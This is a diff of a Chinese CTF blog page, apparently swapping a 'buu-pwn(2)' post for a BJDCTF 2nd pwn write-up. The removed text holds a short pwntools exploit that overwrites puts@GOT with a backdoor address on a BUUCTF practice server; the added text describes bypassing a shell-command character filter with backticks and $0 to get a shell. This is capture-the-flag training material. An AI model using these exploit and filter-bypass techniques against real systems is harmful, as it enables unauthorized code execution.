@@ -165,7 +165,7 @@
                     <article class="post-wrap">
                         <header class="post-header">
                             <h1 class="post-title">
-                                buu-pwn(2)
+                                [BJDCTF 2nd]pwn题目全解
                             </h1>
                             
                                 <!--en-->
@@ -175,22 +175,13 @@
                                         lemon的自留地～
                                     </a>
                                     <span class="post-time">
-                                Date: <a href="#">2020-09-07</a>
+                                Date: <a href="#">2020-09-08</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">0.9
+                                    href="#">2.0
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">184</a></span>
+                                    <span class="post-words">words:<a href="#">557</a></span>
                                     
-                                        <span class="post-category">
-                                Category:
-                                
-                                <a href="https://l3mon629.github.io/tag/PyuFfi-Dl/">buuctf</a>
-                                
-                                <a href="https://l3mon629.github.io/tag/QDD3DbQ78b/">wp</a>
-                                
-                            </span>
-                                        
                                             Views:
                                             <span data-hk-page="current"> - </span>
                                             
@@ -199,40 +190,38 @@
                         </header>
                         
                         <div class="post-content">
-                            <h2 id="picoctf_2018_got_shell">picoctf_2018_got_shell</h2>
-<p>有意思的题目，也不难，理清楚逻辑就能出<br>
-<img src="https://l3mon629.github.io/post-images/1599492885856.png" alt="" loading="lazy"><br>
-main函数，逻辑是输入一个地址v3存入s<br>
-然后输入v4，将v3和v4都输入s<br>
-然后v3的值被赋值给v4的地址<br>
-程序本身有后门<br>
-我们只需要把v3赋值给puts@got，然后把v4的地址赋值给后门地址<br>
-然后调用puts的时候，就会调用后门，然后拿到shell<br>
-exp</p>
-<pre><code class="language-python">from pwn import *
-
-local = 0
-if local == 1:
-	p = process('./PicoCTF_2018_got-shell')
-else:
-	p = remote('node3.buuoj.cn',28761)
-
-elf = ELF('./PicoCTF_2018_got-shell')
-#libc = ELF('./libc.so.6')
-
-def dbg():
-	context.log_level = 'debug'
-
-p.recvuntil('I\'ll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?\n')
-payload = hex(elf.got['puts'])
-p.sendline(payload)
-backdoor = int(0x0804854B)
-payload = hex(backdoor)
-p.sendline(payload)
-
-p.interactive()
-</code></pre>
-<figure data-type="image" tabindex="1"><img src="https://l3mon629.github.io/post-images/1599492985005.png" alt="" loading="lazy"></figure>
+                            <h2 id="bjdctf-2ndrci">[BJDCTF 2nd]rci</h2>
+<p>很不错的题目<br>
+不需要写exp，直接nc做就行了</p>
+<h3 id="逆向分析">逆向分析</h3>
+<p>main函数，有一个init函数，我们进去看看<br>
+<img src="https://l3mon629.github.io/post-images/1599539325518.png" alt="" loading="lazy"><br>
+在init函数里面，程序首先到/tmp文件夹下面新建了若干文件夹，然后随机选一个文件夹进入，记为“藏有imagin”的文件夹，然后提示我们获得道具ls<br>
+<img src="https://l3mon629.github.io/post-images/1599539536110.png" alt="" loading="lazy"><br>
+在下面我们可以向command写入东西，然后system(command)，但是之前有一个检查check1<br>
+我们只能输入a-z和A-Z和“/” “ ” “-”三个特殊字符<br>
+<img src="https://l3mon629.github.io/post-images/1599539609797.png" alt="" loading="lazy"><br>
+接下来是特殊的知识点了，题目考我们关于linux的熟悉度</p>
+<h3 id="inode">inode</h3>
+<blockquote>
+<p>理解inode，要从文件储存说起。<br>
+文件存储在硬盘上，硬盘的最小存储单位叫做“扇区”（Sector）。每个扇区储存512字节（相当于0.5KB）。<br>
+操作系统读取硬盘的时候，不会一个个扇区的读取，这样效率太低，而是一次性连续读取多个扇区，即一次性读取一个“块”（block）。这种由多个扇区组成的“块”，是文件存取的最小单位。“块”的大小，最常见的是4KB，即连续八个sector组成一个block。<br>
+文件数据都储存在“块”中，那么很显然，我们还必须找到一个地方储存文件的“元信息”，比如文件的创建者、文件的创建日期、文件的大小等等。这种储存文件元信息的区域就叫做inode，中文译名为&quot;索引节点&quot;。<br>
+每一个文件都有对应的inode，里面包含了与该文件有关的一些信息。</p>
+</blockquote>
+<p>万物皆文件，文件夹也有其对应的inode号，我们可以通过ls -i查看inode号码<br>
+我们开两个shell，然后一个输入 ls -ali 查看当前目录下的inode，然后再另外一个输入ls -ali /tmp，就可以查看tmp文件夹下的inode号，如下图<br>
+<img src="https://l3mon629.github.io/post-images/1599541303397.png" alt="" loading="lazy"><br>
+<img src="https://l3mon629.github.io/post-images/1599541307983.png" alt="" loading="lazy"><br>
+然后两个inode号相同的就是我们当前所在目录<br>
+<img src="https://l3mon629.github.io/post-images/1599541350072.png" alt="" loading="lazy"><br>
+可以看到我们获得残缺的shell<br>
+有个check2进行检查<br>
+<img src="https://l3mon629.github.io/post-images/1599541397443.png" alt="" loading="lazy"><br>
+两种绕过方法，一个是用拼接符&quot;``&quot;,可以拿shell<br>
+<img src="https://l3mon629.github.io/post-images/1599541535704.png" alt="" loading="lazy"><br>
+第二个是用$0来绕过</p>
 
                         </div>
                         
@@ -240,7 +229,12 @@ p.interactive()
                                 <ul class="markdownIt-TOC">
 <li>
 <ul>
-<li><a href="#picoctf_2018_got_shell">picoctf_2018_got_shell</a></li>
+<li><a href="#bjdctf-2ndrci">[BJDCTF 2nd]rci</a>
+<ul>
+<li><a href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90">逆向分析</a></li>
+<li><a href="#inode">inode</a></li>
+</ul>
+</li>
 </ul>
 </li>
 </ul>
@@ -258,7 +252,7 @@ p.interactive()
 
                                             <p class="copyright-item">
                                                 <span>Permalink:</span>
-                                                <span><a href="https://l3mon629.github.io/post/buu-pwn2/">https://l3mon629.github.io/post/buu-pwn2/</a></span>
+                                                <span><a href="https://l3mon629.github.io/post/bjdctf-2ndpwn-ti-mu-quan-jie/">https://l3mon629.github.io/post/bjdctf-2ndpwn-ti-mu-quan-jie/</a></span>
                                             </p>
 
                                             <p class="copyright-item">
@@ -273,9 +267,9 @@ p.interactive()
                                                         <span style="margin-right:15px">
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
-                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/buu-pwn2/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/buu-pwn2/&sharesource=qzone&title=buu-pwn(2)&pics=https://l3mon629.github.io/images/avatar.png?v=1599541909292&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/buu-pwn2/&sharesource=weibo&title=buu-pwn(2) + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1599541909292 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/bjdctf-2ndpwn-ti-mu-quan-jie/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/bjdctf-2ndpwn-ti-mu-quan-jie/&sharesource=qzone&title=[BJDCTF 2nd]pwn题目全解&pics=https://l3mon629.github.io/images/avatar.png?v=1599541909292&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/bjdctf-2ndpwn-ti-mu-quan-jie/&sharesource=weibo&title=[BJDCTF 2nd]pwn题目全解 + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1599541909292 "><i class="fa fa-weibo "></i></a>
                                                         
                                                                 </span>
                                                                 <!--en-->
@@ -284,16 +278,6 @@ p.interactive()
                                                                         <span>Tag(s):</span>
                                                                         <span class="tag ">
                         
-                        
-                        <a href="https://l3mon629.github.io/tag/PyuFfi-Dl/">#
-                                                buuctf
-                                                    </a>
-                                                    
-                        <a href="https://l3mon629.github.io/tag/QDD3DbQ78b/">#
-                                                wp
-                                                    </a>
-                                                    
-                                                        
                                                             </span>
                                                                     </div>
                                                                     <div>
@@ -306,13 +290,9 @@ p.interactive()
                                                                                 <!---->
                                                                                 <section class="post-nav">
                                                                                     
-                                                                                        <a class="prev" rel="prev" href="https://l3mon629.github.io/post/bjdctf-2ndpwn-ti-mu-quan-jie/">
-                                                                                            [BJDCTF 2nd]pwn题目全解
-                                                                                        </a>
-                                                                                        
                                                                                             
-                                                                                                <a class="next" rel="next" href="https://l3mon629.github.io/post/axb_2019_heap/">
-                                                                                                    axb_2019_heap
+                                                                                                <a class="next" rel="next" href="https://l3mon629.github.io/post/buu-pwn2/">
+                                                                                                    buu-pwn(2)
                                                                                                 </a>
                                                                                                 
                                                                                 </section>
